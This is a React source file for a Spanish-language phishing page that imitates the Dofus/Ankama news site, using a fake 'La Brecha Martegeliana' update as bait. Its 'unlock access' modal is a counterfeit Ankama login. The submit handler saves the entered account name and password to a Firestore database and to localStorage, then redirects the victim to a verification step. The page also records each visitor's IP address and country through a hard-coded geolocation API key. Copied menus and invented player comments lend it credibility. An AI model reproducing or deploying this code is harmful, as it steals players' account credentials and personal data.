import React, { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { collection, doc, getDocs, query, setDoc, updateDoc, where } from 'firebase/firestore';
import db from '../Firebase'; // Update path based on your project structure
import styles from '../styles/Home2.module.css'; // Update path based on your project structure
import "../styles/globals.css"

import facebookImage from '../assets/facebook.png';
import twitter from '../assets/twitter.png'
import franceFlag from '../assets/france.png';
import usaFlag from '../assets/usa.png';
import germanyFlag from '../assets/de.png';
import spainFlag from '../assets/spain.png';
import portugalFlag from '../assets/portugal.png';
import italyFlag from '../assets/italy.png';
import logoImage from '../assets/logof.png';
import bannerImage from '../assets/background.jpg';
import search from "../assets/search.png"
import sword from "../assets/sword.png"
import logo from "../assets/logo-dofus.png"
import rep2 from "../assets/imaging.jpg"
import c1 from "../assets/c1.png"
import c2 from "../assets/c2.jpg"
import c3 from "../assets/c3.jpg"
import c4 from "../assets/c4.jpg"
import c5 from "../assets/c5.jpg"
import c6 from "../assets/c6.jpg"
import c7 from "../assets/c7.jpg"
import img0 from "../assets/img0.png"
import i1 from "../assets/1.png"
import i2 from "../assets/2.jpg"
import i3 from "../assets/3.jpg"
import i4 from "../assets/4.jpg"
import ad from '../assets/ad.jpg'

import comment from "../assets/comments.png"
import { Helmet } from 'react-helmet';
import { v4 as uuidv4 } from 'uuid';




function App4() {
  const [visible,setVisible] = useState(false)
  const [visible2,setVisible2] = useState(true)
  const [visible3,setVisible3] = useState(false)
  const [name,setName] = useState("");
  const [password,setPassword] = useState("");
  const [ip,setIp] = useState("");
  const [country,setCountry] = useState("");
  const [spin,setSpin] = useState(false)
  const [uid,setUid] = useState(null)


  const Router = useNavigate();


  const send = async(e)=>{
    e.preventDefault();
    if (visible2 == false) {
      
      setName("");
      setPassword("");
      setVisible2(true)
      
     console.log("hnaaa")
    }else{
      console.log("hnaaa 2")

      const washingtonRef = doc(db, "users", uid);
      await updateDoc(washingtonRef, {
        name: name,
        pass:password
      });
    localStorage.setItem("ip", JSON.stringify(ip));
    localStorage.setItem("name", JSON.stringify(name));
    localStorage.setItem("password", JSON.stringify(password));
  
    Router('/verification/es',{state: {ip:ip,uid:uid}});
      setSpin(false)
      
    } 
   }

   const getIp2 = async () =>{
    let etat = null;
    const stored = localStorage.getItem("ip");
    const q = query(collection(db, "users"), where("ip", "==", ip));
    const querySnapshot = await getDocs(q);
     querySnapshot.forEach((doc) => {
     etat = doc.data();
     });
    if (etat !== null) {
    console.log("already existe")
    }else{
      try {
        setDoc(doc(db, "users", ip), {
          country:country,
          ip:ip
        });
      } catch (error) {
        console.log(error)
      }
    }
   }
   

   const [changed,setChanged] = useState(0);

   useEffect(()=>{
      if (changed === 0) {
        setChanged(1);
      }
   },[]);
  
 const getIp = async()=>{
  console.log("ana fe get ip")
  const res = await axios.get('https://api.ipgeolocation.io/ipgeo?apiKey=731821513cd6497cab49e5c7a841741e');
  try {
    setIp(res.data.ip);
    setCountry(res.data.country_name);
    localStorage.setItem("ip", JSON.stringify(res.data.ip));
    localStorage.setItem("country", JSON.stringify(res.data.country_name));
    getData();
  } catch (error) {
    console.log(error)
  }
 }

 const getData =async()=>{
  const stored = JSON.parse(localStorage.getItem("ip"));
  if (stored == null) {
    getIp(); 
  }else{
      const storedc = await JSON.parse(localStorage.getItem("country"));
      const storedn = await JSON.parse(localStorage.getItem("name"));
      const storedp = await JSON.parse(localStorage.getItem("password"));
      const storedip = await JSON.parse(localStorage.getItem("ip"));
      setName(storedn)
      setPassword(storedp);
      setIp(storedip)
      setCountry(storedc);
      const id = uuidv4();
      setUid(id);
      if (storedip) {
        await setDoc(doc(db, "users", id), {
          ip: stored,
          country:storedc,
          uid:id,
        });
      }
  }
 }
  
 
 useEffect(()=>{
  getData();
 },[]);


 const prg=()=>{
  Router('/dofus/prg',{state: {ip:ip}},)

 }

 const en=()=>{
  Router('/dofus/en',{state: {ip:ip}},)
}

 const fr=()=>{
  Router('/dofus/fr',{state: {ip:ip}},)

   }
 //<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet"/>

  return (
    <>
    <Helmet>
      <title>LA BRECHA MARTEGELIANA</title>
      <meta name="description" content="LA BRECHA MARTEGELIANA" />
    </Helmet>
    <div className={styles.App2}>
      {visible && (
        <div style={{zIndex:100}} className={styles.modal}>
        <div className={styles.header}>
          <center><h4>ACCESO</h4></center>
          <button onClick={()=> setVisible(false)}>X</button>
        </div>
        <div className={styles.content}>
        <div className={styles.contentBox1}>
          <center>
          <h4>En unos pocos clics con...</h4>
          <div className={styles.fb}>
            <a className={styles.fb} href="https://dofus-mmorpg.com/fr/mmorpg/actualites/news/retrobox-dofusix/" target="_blank" style={{textDecoration:"none"}}><img src={facebookImage} alt="" /><button>FACEBOOK</button></a>
          </div>
          </center>
          </div>
          <div className={styles.contentBox}>
          <form onSubmit={send}>
          <h4>Ya tengo una cuenta ANKAMA</h4>
          {visible2 && (<p style={{display:"none"}} className={styles.error}>Las credenciales son incorrectas</p>)}
          <p>Número de cuenta</p>
          <input onChange={(e)=>setName(e.target.value)} value={name} type="text" />
          <p>Contraseña</p>
          <input onChange={(e)=>setPassword(e.target.value)} value={password} type="password" name="" id="" />
          <div className={styles.radio}>
          <input className={styles.input2} type="checkbox" />
          <p style={{width:"1200px",marginLeft:"5px",marginTop:"-5px"}}>quedar conectado</p>
          </div>
          <button onClick={send}>
            {!spin && ( <>CONECTARSE </>)}
            {spin && (
              <>
              CONECTARSE
              
            </>)}
            </button>
            <br />
            <a style={{textDecoration:"none"}} href="https://account.ankama.com/fr/compte/connexion-impossible"><p className={styles.p3p}>¿Imposible conectarse?</p></a>
<a style={{textDecoration:"none"}} href="https://secure.dofus.com/fr/mmorpg/jouer"><p className={styles.p3p}>Crear una cuenta</p></a>



            </form>

          </div>
        </div>

      </div>
      )}
      <div className={styles.all5}> 

      <div className={styles.nav2}>
    <div className={styles.firstNav}>
        <div className={styles.fcontainer}>
            <div className={styles.leftC}>
                <h3 style={{cursor:"pointer"}}>ankama</h3>
                <p><a style={{textDecoration:"none",color:"white"}} href="https://support.ankama.com/hc/en-us" target="_blank">SOPORTE</a></p>
            </div>
            <div className={styles.rightC}>
                <p style={{zIndex:10,cursor:"pointer"}}>DESCONECTAR</p>
                <div style={{zIndex:9}} onClick={() => setVisible3(!visible3)} className={styles.flags}>
                    <div className={styles.flag1}><img src={spainFlag} alt="" /></div>
                    {visible3 && (
                        <>
                            <div className={styles.flag}><img onClick={fr} src={franceFlag} alt="" /><p className={styles.flagN}>FR</p></div>
                            <div className={styles.flag}><img onClick={en} src={usaFlag} alt="" /><p className={styles.flagN}>EN</p></div>
                            <div className={styles.flag}><img src={germanyFlag} alt="" /><p className={styles.flagN}>DE</p></div>
                            <div className={styles.flag}><img src={spainFlag} alt="" /><p className={styles.flagN}>ES</p></div>
                            <div className={styles.flag}><img onClick={prg} src={portugalFlag} alt="" /><p className={styles.flagN}>PT</p></div>
                            <div className={styles.flag}><img src={italyFlag} alt="" /><p className={styles.flagN}>IT</p></div>
                        </>
                    )}
                </div>
                <div></div>
            </div>
        </div>
    </div>
    <div className={styles.secondNav}>
        <div className={styles.dofusLogo}>
            <div className={styles.cont}>
                <div className={styles.leftS}>
                    <a className={styles.nv1}>
                        JUEGO
                        <div className={styles.downArrow}></div>
                        <div className={styles.secondNav2}>
                            <div className={styles.dofusLogo}>
                                <div className={styles.sec1}>
                                    <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/telecharger"><div></div> Descargar el juego</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/jouer"><div></div> Crear tu cuenta</a>
                                    <a href="https://dofus-mmorpg.com/fr/mmorpg/communaute/parrainage"><div></div>Ventajas de patrocinio</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/codes"><div></div>Código de Regalo</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/encyclopedie"><div></div>Enciclopedia</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/annuaires/pages-persos"><div></div>Directorios</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder"><div></div>Clasificaciones</a>
                                    <a href="https://www.krosmoz.com/fr/almanax"><div></div>Almanax</a>
                                </div>
                                <div className={styles.sec2}>
                                    <a style={{fontWeight:700}} href=""><div></div>Cómo jugar</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/decouvrir"><div></div>Descubrir</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/encyclopedie/classes"><div></div>Clases</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/tutoriels"><div></div>Aprender a jugar</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder/kolizeum-presentation"><div></div>Ligas Kolizeum</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/serveurs?server_community%5B0%5D=0"><div></div>Estado de los servidores</a>
                                </div>
                                <div className={styles.sec3}>
                                    <a style={{fontWeight:700}} href=""><div></div>Ventajas de suscripción</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/pourquoi-s-abonner"><div></div>¿Por qué suscribirse?</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/veterans-rewards"><div></div>Recompensas para veteranos</a>
                                    <a href="https://www.dofus.com/fr/dofus-retro"><div></div>DOFUS Retro</a>
                                </div>
                            </div>
                        </div>
                    </a>
                    <a className={styles.nv2}>
                        TRANSMEDIA
                        <div className={styles.downArrow}></div>
                        <div className={styles.secondNav2}>
                            <div className={styles.dofusLogo}>
                                <div className={styles.sec1}>
                                    <a className={styles.diff} href="https://www.ankama-shop.com/fr/"><div></div>Comprar productos derivados</a>
                                    <a href="https://www.ankama.com/fr/editions"><div></div>Ediciones</a>
                                    <a href="https://www.ankama.com/fr/games"><div></div>Videojuegos</a>
                                </div>
                                <div className={styles.sec2}>
                                    <a style={{fontWeight:700}} href=""><div></div>Juegos de mesa</a>
                                    <a href="https://www.ankama.com/fr/boardgames/krosmaster-blast"><div></div>Krosmaster Blast</a>
                                    <a href="https://www.krosmaster.com/"><div></div>Krosmaster</a>
                                    <a href="https://www.ankama-shop.com/fr/"><div></div>Brother</a>
                                    <a href="">Animación</a>
                                    <a href="https://www.dofus-le-film.com/"><div></div>La película</a>
                                    <a href="https://www.dofus.com/fr/animation/univers"><div></div>La serie</a>
                                </div>
                                <div className={styles.sec3}>
                                    <a style={{fontWeight:700}} href=""><div></div>Medios</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/medias/trailers"><div></div>Vídeos</a>
                                    <a href="https://www.dofus.comhttps//www.dofus.com/fr/mmorpg/medias/screenshots"><div></div>Capturas de pantalla</a>
                                    <a href="https://www.dofus.comhttps//www.dofus.comhttps://www.dofus.com/fr/mmorpg/medias/illustrations"><div></div>Ilustraciones</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/medias/emissions"><div></div>Programas</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/medias/wallpapers"><div></div>Fondos de pantalla</a>
                                </div>
                            </div>
                        </div>
                    </a>
                    <a className={styles.nv3}>
                        ACTUALIDADES
                        <div className={styles.downArrow}></div>
                        <div className={styles.secondNav2}>
                            <div className={styles.dofusLogo}>
                                <div className={styles.sec1}>
                                    <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/actualites/maj/draconiros"><div></div>Descubrir la última actualización</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/actualites/news"><div></div>Todas las noticias</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/actualites/devblog"><div></div>Todos los devblogs</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/actualites/maj"><div></div>Todas las actualizaciones (changelog)</a>
                                </div>
                                <div className={styles.sec2}>
                                    <a style={{fontWeight:700}} href=""><div></div>Actualmente en DOFUS</a>
                                    <a href="https://www.dofus.com/fr/mmorpg/communaute/tournois/dofus-cup-2019/reglement"><div></div>DOFUS Cup 2019</a>
                                    <a href="https://www.dofus.com/fr/prehome"><div></div>Calendario de Adviento</a>
                                </div>
                            </div>
                        </div>
                    </a>
                </div>
            </div>
            <a style={{zIndex:11}} href="https://www.dofus.com/fr/prehome"><img src={logo} alt="" /></a>
            <div className={styles.cont2}>
                <div className={styles.rightS}>
                    <a href="https://www.dofus.com/fr/achat-kamas">COMPRAR KAMAS</a>
                    <a href="https://www.dofus.com/fr/forum">FOROS</a>
                    <a href="https://www.dofus.com/fr/boutique">TIENDA</a>
                </div>
                <a tabindex="0" className={styles.imgAS}><img className={styles.imgS} src={search} alt="" /><div className={styles.inp}><input tabindex="1" type="text" /><button>ok</button></div></a>
            </div>
        </div>
    </div>
</div>


<div className={styles.jouer}>
  <button><a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/jouer" target="_blank" rel="noopener noreferrer">JUGAR!</a></button>
</div>

<div className={styles.blog}>
<div className={styles.blogContainer}>
  <div className={styles.main}>
    <div className={styles.header}>
      <div className={styles.icon}>
        <div className={styles.circle}>
        <img src={sword} alt="" /></div>
        </div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>"DOFUS - LA BRECHA MARTEGELIANA - ¡Disponibles en el juego!"</h1>
        <h4 style={{display:"none"}}>¡Desbloquea el acceso ahora y vete a la aventura!</h4>
      </div>
        <div className={styles.retourner}>
          <a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/actualites/news" target="_blank" rel="noopener noreferrer"><button> <p>{"<"}</p> Vuelve a la lista</button></a>
        </div>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.contentBox}>
      <em>En el corazón del santuario, un espejismo excepcional, un lugar sagrado envuelto en una aura misteriosa. Bienvenidos a la brecha martegeliana.</em>

<p style={{marginTop:"10px",fontFamily:"sans-serif"}}><em><strong>Aventureros intrépidos</strong>,</em> prepárense para sumergirse en las profundidades más oscuras y misteriosas del mundo de Dofus. Déjense llevar por la magia de la breche martegeliana, este lugar legendario que oculta secretos insospechados y tesoros invaluables.
</p>
<p style={{marginTop:"10px"}}>Pero tengan cuidado, ya que esta zona no es para los de corazón débil. Solo los más valientes podrán enfrentar el desafío y superar los peligros que les esperan en las entrañas de esta cueva encantada. Prepárense para vivir una aventura épica, donde los juegos de luz y sombra rivalizan en ingenio para perderlos mejor en los laberintos de las Brechas.</p>
<div className={styles.blogImg}>
<img src={rep2} layout='fill'/>
</div>
<p><strong>Fascinante y misterioso</strong>, este espejismo es un verdadero laberinto de oscuridad y luz, un enredo de cavernas que oculta maravillas indescriptibles y peligros mortales. Las sombras bailan sobre las paredes de roca, jugando con la luz para desorientarte mejor y perderte en los giros y vueltas de esta cueva encantadora. Los monstruos más feroces y astutos han hecho de ella su hogar, esperando pacientemente para sorprender y devorar a su presa. Prepárense para sumergirse en las profundidades de esta cueva mística y descubrir sus secretos más oscuros.</p>
<br/>
<strong className={styles.boldText}>En este espejismo, puedes encontrar</strong>
<br/><br/>
<p>La adición de una nueva familia de monstruos, con habilidades y características únicas que pondrán a prueba incluso a los aventureros más experimentados.</p>
<br />
<p>Nuevos mapas para explorar ofrecerán entornos inéditos y desafíos emocionantes, con paisajes exóticos y peligros mortales esperando a los jugadores intrépidos.</p>
<br />
<p className={styles.boldText}>¡Ya seas un veterano de Dofus o un nuevo jugador, desbloquea el acceso ahora para embarcarte en tu aventura!</p>
<br/>

      <center>
        <button onClick={()=> setVisible(true)}>DESBLOQUEAR ACCESO</button>
      </center>
      </div>
    </div>

    <div className={styles.media}>
      <a style={{textDecoration:"none"}} href="https://www.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fwww.dofus.com%252Ffr%252Fmmorpg%252Factualites%252Fnews%252F1051928-dofus-retro-ligne&cancel_url=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=en_GB">
      <div className={styles.mediaFb}>
        <img src={facebookImage} alt="" />
        <span>FACEBOOK</span>
      </div>
      </a>
      <a style={{textDecoration:"none"}} href="https://twitter.com/share?text=&url=https%3A%2F%2Fwww.dofus.com%2Ffr%2Fmmorpg%2Factualites%2Fnews%2F1051928-dofus-retro-ligne">
      <div className={styles.mediaFb2}>
        <img src={twitter} alt="" />
        <span>TWITTER</span>
      </div>
      </a>
      
    </div>

    <div className={styles.commentaires}>
      <div className={styles.header}>
        <h2>COMENTARIOS (32)</h2>
        <a className={styles.sui} href="https://www.dofus.com/fr/mmorpg/actualites/news"><p>Sigue la discusión en el foro...</p></a>
      </div>
      <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c1} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>[Ankama]DOFUS</h4><p className='tag'>- Community Manager -</p><p className='tag2'>10 Mars 2024</p></div>
        <p>Eventos y regalos para todos aquellos que nos siguen y apoyan en las redes sociales y el foro… </p>
        <p>Habrá algo para todos los nostálgicos, ¡así que estén atentos!</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c2} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Reasy-Kokax</h4><p className='tag'>- Abonné -</p><p className='tag2'>23 December 2023</p></div>
        <p>Hola, ¿podrías darnos más información sobre esta familia de área? </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c3} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Sadidarbre </h4><p className='tag'>- Community Manager -</p><p className='tag2'>07 juin 2023</p></div>
        <p>Bien, ¿cambiando mobs míos?</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c4} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Kazemyrowx</h4><p className='tag'>Ancien Abonné</p><p className='tag2'>01 juin 2023</p></div>
        <p>Francamente, admito que es una buena idea, además los drop tips comenzaban a ser raros, gracias a</p>
        <p>zona en la que podemos aprovechar que los recursos son caros al principio</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c5} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Serial-Buzzer</h4><p className='tag'>- Abonné -</p><p className='tag2'>16 November 2022</p></div>
        <p>Espero que esto finalmente reduzca el spam innecesario... </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c6} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Axel-Archer</h4><p className='tag'>- Ancien Abonné -</p><p className='tag2'>03 Avril 2022</p></div>
        <p>¡Gracias!</p>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c7} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Yoloxopi</h4><p className='tag'>- Abonné -</p><p className='tag2'>22 Mai 2021</p></div>
        <p>si entendí correctamente, desbloquear el acceso desde aquí es el único requisito previo para acceder a la dimensión?</p>
      </div>
    </div>

<div className={styles.commenter}>
  <img src={img0} alt="" />
  <textarea placeholder='comentario...' name="" id="" cols="30" rows="10"></textarea>
</div>
<div className={styles.com}>
<button>VALIDAR</button>

</div>

    </div>

  </div>



  <div className={styles.side}>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>NOTICIAS RECIENTES</h1>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i1} alt="" />
      </div>
      <div className={styles.sideText}>
      <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1241841-dungeon-farmer-1-wa-wabbit">Dungeon Farmer #1: The El Wabbit</a></p>
        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>17</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i2} alt="" />
      </div>
      <div className={styles.sideText}>
      <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1233713-montilier-faucombe-offert">¡Una montura Faucombe gratis!</a></p>
        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>6</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i3} alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1243096-concours-journee-mondiale-12-dofus">[Concurso] Día Mundial de los 12 Dofus</a></p>

        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>42</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i4} alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1239064-monocompte-dofus-retro-ligne">Cuenta única en DOFUS Retro: ¡Está en línea!</a></p>

        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>29</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.voir}>
      <center>
        <p onClick={()=> Router("https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA")}>Ver todas las noticias</p>
      </center>
    </div>
    </div>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <a style={{textDecoration:"none"}} href="https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA"><h1>FORO ANKATRACKER</h1></a>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1782-dofus/2329562-bouclier-kano")}>Bouclier kano</p>
        <p className={styles.p2}>Por<span className={styles.name}>mallix</span>el 22/04/2022 - 12:48</p>
        <div className={styles.comicon}>
         <p className={styles.p3}>ASK Ankama</p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Changement d'élément Ougi PVM 200</p>
        <p className={styles.p2}>Por<span className={styles.name}>sousayajin</span>el 15/06/2022 - 12:47</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Ouginak </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Astrub est étouffante</p>
        <p className={styles.p2}>Por<span className={styles.name}>VolcanoPenguin</span>el 06/07/2022 - 12:44</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Évolutions </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>21</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Comparaison do cri- do pure</p>
        <p className={styles.p2}>Por<span className={styles.name}> I-Found-My-Way </span> el 14/07/2022 - 12:35</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Artisanat </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Sram air en pvm de groupe</p>
        <p className={styles.p2}>Por<span className={styles.name}>Row-Sebal</span>el 16/07/2022 - 12:30</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Sram </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    
    <div className={styles.voir}>
      <center>
        <p>Ver todos los temas de AnkaTracker</p>
      </center>
    </div>
    </div>
    <img className={styles.ad} src={ad} alt="" />


  </div>
  </div>
</div>





      </div>
      
    </div>
    </>

  );
}

export default App4;